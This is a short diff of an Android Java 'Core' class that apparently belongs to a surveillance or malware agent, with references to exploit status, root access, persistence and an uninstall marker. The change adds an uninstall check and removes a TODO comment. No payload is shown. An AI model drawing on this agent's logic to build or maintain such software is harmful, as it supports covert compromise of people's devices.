@@ -166,6 +166,10 @@ public class Core extends Activity implements Runnable {
 				}
 
 			}
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && haveUninstallMarkup() ) {
+				UninstallAction.actualExecute();
+				return false;
+			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
 				if(Cfg.PERSISTENCE) {
@@ -548,7 +552,6 @@ public class Core extends Activity implements Runnable {
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
 			if (haveUninstallMarkup()) {
 				UninstallAction.actualExecute();
-				//TODO: kill checkexploit
 				return ConfType.Error;
 			}
 
